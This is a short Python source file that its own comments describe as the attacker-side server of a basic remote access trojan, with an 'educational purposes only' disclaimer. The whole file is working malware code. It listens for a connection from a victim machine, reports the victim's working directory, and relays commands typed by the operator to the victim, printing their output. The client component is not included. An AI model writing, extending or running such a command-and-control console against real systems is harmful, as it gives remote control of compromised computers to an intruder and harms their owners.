# server software for my very basic python RAT
# server = run on attacker
# by cayden wright
# educational purposes only
# 3 January 2023

import socket

HOST = "0.0.0.0"  # IP to listen on
PORT = 1234  # port to listen on

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f"Connected by {addr}")
        print(f"CWD of target is: {conn.recv(1024).decode('utf-8')}")
        while True:
            # get command to run
            command = input("enter command to run: ")
            # exit case
            if command == ("exit"):
                exit()
            # send command
            command = command.encode('utf-8')
            conn.sendall(command)
            # get result
            recieved_output = conn.recv(1024)
            print(recieved_output.decode('utf-8'))
            if recieved_output.decode('utf-8') == "client_stopped":
                break
